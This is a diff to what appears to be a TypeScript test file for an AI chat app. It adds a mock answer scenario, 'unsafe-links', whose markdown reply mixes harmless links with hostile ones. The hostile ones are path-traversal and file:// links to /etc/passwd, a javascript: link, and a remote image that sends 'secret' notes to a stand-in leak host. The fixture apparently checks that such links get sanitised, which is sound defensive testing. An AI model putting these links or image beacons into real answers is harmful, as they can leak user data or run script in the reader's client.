@@ -205,6 +205,30 @@ const answerScenarios: Scenario[] = [
         ),
     },
     {
+        name: 'unsafe-links',
+        description:
+            'An answer with in-app, web, mail, relative, file and script links and a remote image',
+        reply: () =>
+            complete([
+                text(
+                    [
+                        '## Links',
+                        '',
+                        '- In-app: [Sermon 63-0318](wmb://sermon/63-0318/tur/1/1)',
+                        '- Web: [Docs](https://wmb-table.web.app/)',
+                        '- Mail: [Contact](mailto:contact@example.com)',
+                        '- Relative: [RELATIVE-LINK](../../../../../../etc/passwd)',
+                        '- File: [FILE-LINK](file:///etc/passwd)',
+                        '- Script: [SCRIPT-LINK](javascript:alert(document.title))',
+                        '',
+                        '![IMAGE-ALT](https://leak.example.invalid/pixel.png?notes=secret)',
+                        '',
+                        'MOCK-LINKS-DONE',
+                    ].join('\n'),
+                ),
+            ]),
+    },
+    {
         name: 'research-worker',
         description: 'Inner steps of the research sub-agent (started by the subagent scenario)',
         reply: sequence(
